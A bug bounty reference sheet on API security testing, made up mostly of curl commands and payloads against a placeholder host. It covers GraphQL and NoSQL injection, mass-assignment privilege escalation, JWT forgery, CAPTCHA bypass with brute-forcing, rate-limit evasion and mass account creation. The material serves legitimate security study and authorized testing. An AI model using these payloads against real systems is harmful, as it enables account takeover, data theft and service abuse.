# API TESTING — COMPLETE BUG BOUNTY REFERENCE
> Source: PortSwigger Web Security Academy + PayloadsAllTheThings
> For: Bug bounty hunting, CTF, and security assessments

---

## 1. CONCEPTS

### What is API Security Testing?
APIs (REST, GraphQL, SOAP, WebSocket) are the backbone of modern web apps. API security testing focuses on finding vulnerabilities in how endpoints handle authentication, authorization, input validation, and business logic.

### API Types
- **REST**: HTTP methods (GET/POST/PUT/DELETE) + JSON payloads
- **GraphQL**: Single endpoint + query language
- **SOAP**: XML-based + WSDL definitions
- **WebSocket**: Full-duplex communication
- **gRPC**: Protocol Buffers + HTTP/2

---

## 2. API DISCOVERY & RECONNAISSANCE

### 2.1 Documentation Discovery
```bash
# Swagger/OpenAPI endpoints
curl -s https://target.com/api
curl -s https://target.com/swagger
curl -s https://target.com/swagger-ui.html
curl -s https://target.com/openapi.json
curl -s https://target.com/api-docs
curl -s https://target.com/v1/api-docs
curl -s https://target.com/v2/api-docs
curl -s https://target.com/v3/api-docs
curl -s https://target.com/swagger-resources
curl -s https://target.com/docs
curl -s https://target.com/redoc

# GraphQL endpoint
curl -s https://target.com/graphql
curl -s https://target.com/graphiql
curl -s https://target.com/api/graphql
curl -s https://target.com/v1/graphql
```

### 2.2 Hidden Endpoint Discovery via JavaScript
```bash
# Extract API paths from JS bundles
curl -s https://target.com/static/js/app.js | grep -oE '/api/[a-zA-Z0-9/_-]+'
curl -s https://target.com/static/js/app.js | grep -oE 'https?://[a-zA-Z0-9._/-]+'
curl -s https://target.com/static/js/app.js | grep -oE '"/(v[0-9]+/)?[a-zA-Z]+(/[a-zA-Z]+)*"' | sort -u

# Common JS bundle locations
curl -s https://target.com/static/js/main.*.js
curl -s https://target.com/assets/js/bundle.js
curl -s https://target.com/dist/app.js
curl -s https://target.com/_next/static/chunks/*.js
```

### 2.3 API Path Brute-Force
```bash
# Common API paths
/api/v1/
/api/v2/
/api/v3/
/api/admin/
/api/internal/
/api/debug/
/api/config
/api/health
/api/status
/api/metrics
/api/env
/api/version

# Framework-specific
/api/rest/
/api/soap/
/api/graphql
/api/rpc/
```

---

## 3. HTTP METHOD TESTING

### 3.1 Method Enumeration
```bash
# Test all methods on each endpoint
for method in GET POST PUT PATCH DELETE OPTIONS TRACE HEAD; do
  curl -s -X $method -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer TOKEN" \
    https://target.com/api/users/123
  echo " $method"
done
```

### 3.2 Method Override Bypass
```bash
# If DELETE is blocked, try override headers:
POST /api/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /api/users/123 HTTP/1.1
X-Method-Override: DELETE

POST /api/users/123 HTTP/1.1
X-HTTP-Method: DELETE

POST /api/users/123 HTTP/1.1
Method-Override: DELETE
```

### 3.3 OPTIONS Response Analysis
```bash
OPTIONS /api/users HTTP/1.1
# Look for:
# Access-Control-Allow-Methods: GET, POST, PUT, DELETE
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

---

## 4. CONTENT-TYPE MANIPULATION

### 4.1 Type Switching
```bash
# JSON → XML → YAML → Form → Multipart

# JSON (default)
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass"}'

# XML (if parser accepts it)
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<login><username>admin</username><password>pass</password></login>'

# YAML
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/x-yaml" \
  -d 'username: admin\npassword: pass'

# Form data
curl -X POST https://target.com/api/login \
  -d 'username=admin&password=pass'

# Multipart
curl -X POST https://target.com/api/login \
  -F 'username=admin' -F 'password=pass'
```

### 4.2 Parameter Pollution
```bash
# Duplicate parameters
GET /api/user?id=1&id=2

# JSON array vs single value
{"id": [1, 2, 3]}
{"id": "1"}
{"id": 1}
```

---

## 5. MASS ASSIGNMENT / BULK ASSIGNMENT

### 5.1 Hidden Parameter Discovery
```bash
# Test common hidden parameters
POST /api/register HTTP/1.1
Content-Type: application/json

# Normal registration
{"username":"test","email":"test@test.com","password":"pass123"}

# Try adding hidden fields
{"username":"test","email":"test@test.com","password":"pass123","role":"admin"}
{"username":"test","email":"test@test.com","password":"pass123","isAdmin":true}
{"username":"test","email":"test@test.com","password":"pass123","verified":true}
{"username":"test","email":"test@test.com","password":"pass123","credit":10000}
{"username":"test","email":"test@test.com","password":"pass123","plan":"premium"}
```

### 5.2 Profile Update Mass Assignment
```bash
# Normal update
PUT /api/user/profile HTTP/1.1
{"name":"John","email":"john@test.com"}

# Try hidden fields
PUT /api/user/profile HTTP/1.1
{"name":"John","email":"john@test.com","role":"admin","credit":100000,"verified":true}
```

### 5.3 JSON Property Manipulation
```bash
# Prototype pollution (Node.js)
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}

# Overwrite config
{"$set":{"role":"admin"}}
```

---

## 6. GRAPHQL SPECIFIC

### 6.1 Introspection Query
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind }
        }
      }
    }
  }
}
```

**curl:**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'
```

### 6.2 GraphQL Enumeration
```bash
# List all types
{"query":"{__type(name:\"User\"){fields{name,type{name}}}}"}

# List all queries
{"query":"{__schema{queryType{fields{name,description,args{name}}}}}"}

# List all mutations
{"query":"{__schema{mutationType{fields{name,description,args{name}}}}}"}
```

### 6.3 GraphQL Injection
```graphql
# SQL injection via GraphQL
query {
  user(name: "admin' OR '1'='1") {
    id
    name
    email
  }
}

# NoSQL injection
query {
  user(filter: {username: "admin", password: {$ne: ""}}) {
    id
    name
    email
    password
  }
}
```

### 6.4 GraphQL Authorization Bypass
```graphql
# Access admin fields as regular user
query {
  users {
    edges {
      node {
        id
        name
        email
        passwordHash
        role
        isAdmin
      }
    }
  }
}

# Mutation to elevate privileges
mutation {
  updateUser(id: "self", input: {role: "admin"}) {
    id
    role
  }
}
```

### 6.5 GraphQL Rate Limit Bypass
```bash
# Batch requests
[
  {"query":"{user(id:1){name,email}}"},
  {"query":"{user(id:2){name,email}}"},
  {"query":"{user(id:3){name,email}}"}
]

# Aliases for nested queries
query {
  a1: user(id:1){name email}
  a2: user(id:2){name email}
  a3: user(id:3){name email}
}
```

### 6.6 GraphQL Error-Based Enumeration (Introspection Disabled)
When introspection is blocked, error messages from mutation attempts reveal the full API surface.

```bash
# Probe mutation name → reveals if it exists + its arguments
curl -X POST https://target.com/graphql -d '{"query":"mutation { Login(email:\"x\",password:\"y\") { token } }"}'
# → Error reveals: argument names, return fields, auth check details

# Test each mutation to map the full surface
for m in Login Register addSite cancelPlan deleteDomain updateEmail enable2FA; do
  curl -s -X POST https://target.com/graphql \
    -d "{\"query\":\"mutation { ${m}(test:\"probe\") { id } }\"}" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f'[{m}] {d.get(\"extensions\",{}).get(\"debugMessage\",\"ok\")[:80]}')"
done
```

**Key signals in error responses:**
- `"Unknown argument 'X'"` → server accepted other args, rejected this one
- `"Expected type Y"` → argument type revealed (String, Int, Boolean, Enum)
- `"Invalid enum value"` → enum name + valid values leaked
- `"Permission denied"` → mutation executes server-side before auth check
- Database error messages → database type/structure disclosed

→ Full technique: `references/graphql-attack-patterns.md` Section 15

### 6.7 reCAPTCHA Null-Token Bypass
GraphQL mutations with reCAPTCHA may skip validation when receiving a null string.

```bash
# Normal: CAPTCHA required
mutation { login(email:"u@t.com", password:"x", recaptchaToken:"valid_token") }

# Bypass: send string "null" instead of omitting
mutation { login(email:"u@t.com", password:"x", recaptchaToken:"null") }
```

**Testing sequence:**
1. Find mutation accepting `recaptchaToken` parameter
2. Test omit field → may get "required field" error
3. Test send `"null"` string → CAPTCHA may be skipped
4. Test send `""` → may bypass null-check
5. If bypass works → brute-force login without CAPTCHA limitation

---

## 7. AUTHENTICATION & AUTHORIZATION

### 7.1 API Key Exposure
```bash
# Check for API keys in JS bundles
curl -s https://target.com/static/js/app.js | grep -iE "api[_-]?key|secret|token|password|auth"

# Check common config endpoints
GET /api/config
GET /api/settings
GET /api/health
GET /api/env
GET /api/version
GET /.env
GET /config.json
GET /api-keys
```

### 7.2 BOLA (Broken Object Level Authorization)
```bash
# Test sequential IDs
GET /api/users/1 → GET /api/users/2 → GET /api/users/3

# Test UUIDs (if predictable pattern)
GET /api/users/550e8400-e29b-41d4-a716-446655440000

# Test with different auth contexts
# User A token accessing User B's resources
GET /api/users/B_ID/orders
```

### 7.3 BFLA (Broken Function Level Authorization)
```bash
# Regular user accessing admin endpoints
GET /api/admin/users
GET /api/admin/config
POST /api/admin/deleteUser
GET /api/internal/users
GET /api/debug/config
```

### 7.4 Token Manipulation
```bash
# JWT None algorithm
# Change header: {"alg":"none"} and remove signature

# JWT role manipulation
# Decode payload, change {"role":"user"} to {"role":"admin"}

# API key in URL
GET /api/data?api_key=KEY

# Token in Referer
GET /api/data
Referer: https://target.com/auth?token=TOKEN
```

---

## 8. RATE LIMITING & ABUSE

### 8.1 Rate Limit Bypass
```bash
# IP rotation
curl -H "X-Forwarded-For: 1.1.1.$i" https://target.com/api/login

# Header manipulation
curl -H "X-Real-IP: 1.1.1.$i" https://target.com/api/login
curl -H "X-Originating-IP: 1.1.1.$i" https://target.com/api/login
curl -H "X-Client-IP: 1.1.1.$i" https://target.com/api/login

# Case sensitivity
GET /API/LOGIN vs GET /api/login

# Path normalization
GET /api/login/ vs GET /api/login
GET //api//login
```

### 8.2 Mass Registration
```bash
# Automated account creation
for i in $(seq 1 1000); do
  curl -X POST https://target.com/api/register \
    -d "{\"username\":\"user$i\",\"email\":\"user$i@test.com\",\"password\":\"pass$i\"}" \
    -H "Content-Type: application/json" &
done
```

---

## 9. WEBSOCKET TESTING

### 9.1 Connection & Message Inspection
```bash
# Connect with wscat
wscat -c wss://target.com/ws

# Send messages and inspect responses
> {"action":"subscribe","channel":"admin"}
> {"action":"getUser","id":"1"}
> {"action":"getUser","id":"2"}
```

### 9.2 WebSocket Attacks
```bash
# Cross-site WebSocket hijacking
# Origin: https://attacker.com

# Injection in WebSocket messages
{"username":"admin\" OR 1=1--"}
{"query":"SELECT * FROM users WHERE id=" + event.data}
```

---

## 10. DETECTION METHODOLOGY

### Step-by-Step
1. **Map all endpoints** — Spider/crawl, JS analysis, Swagger discovery
2. **Identify API type** — REST, GraphQL, SOAP, WebSocket
3. **Test HTTP methods** — All methods on each endpoint
4. **Test content types** — JSON, XML, YAML, form data
5. **Test authentication** — Token manipulation, API key exposure
6. **Test authorization** — BOLA, BFLA, IDOR on resources
7. **Test input validation** — SQL injection, NoSQL injection, XSS
8. **Test rate limiting** — Bypass attempts, brute-force
9. **Test mass assignment** — Hidden parameters, role manipulation
10. **Test business logic** — Negative quantities, bypassing steps

### Quick Checks
```bash
# Test all endpoints with no auth
curl https://target.com/api/users
curl https://target.com/api/admin
curl https://target.com/api/debug
curl https://target.com/graphql

# Test with expired/invalid token
curl -H "Authorization: Bearer invalid_token" https://target.com/api/users

# Test CORS
curl -H "Origin: https://evil.com" https://target.com/api/users

# Test response for excessive data
# Check if API returns more fields than frontend displays
```

---

## 11. TOOLS

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept and modify API requests |
| Postman | API testing and collection automation |
| ffuf | Endpoint discovery and fuzzing |
| Arjun | Hidden parameter discovery |
| graphql-map | GraphQL enumeration and testing |
| wfuzz | Brute-force API endpoints |
| curl | Manual API testing |
| httpie | HTTP client with JSON support |

---

*Last updated: 2026-09-03*
*Sources: PortSwigger Academy, PayloadsAllTheThings, OWASP API Security Top 10*
